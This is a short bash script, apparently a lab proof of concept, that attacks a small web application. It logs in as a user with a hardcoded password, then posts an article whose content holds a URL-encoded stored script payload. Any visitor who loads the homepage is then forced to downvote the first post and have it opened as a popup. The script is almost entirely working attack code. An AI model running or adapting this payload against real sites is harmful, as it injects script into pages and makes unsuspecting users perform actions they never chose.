#!/bin/bash
IP="$1";
PORT="$2";

echo "Logging in as Alice";
curl -c cookies.txt --data "username=alice&password=passw0rd&form=login&submit=Login" "$IP:$PORT/post.php";

echo "Writing CSRF to content of a new article";
curl -b cookies.txt --data "title=&content=%3Cscript%3Ewindow.open(%22$IP:$PORT%2Fvote.php%3Fid%3D1%26vote%3D-1%22)%3B%3C%2Fscript%3E&type=1&form=content&submit=Post" "$IP:$PORT/post.php";

echo "========================";
echo "CSRF done";
echo "Now whenever Alice loads the homepage she will automatically downvote the first post";
echo "The attacker also opens the first post as a popup";
echo "========================";
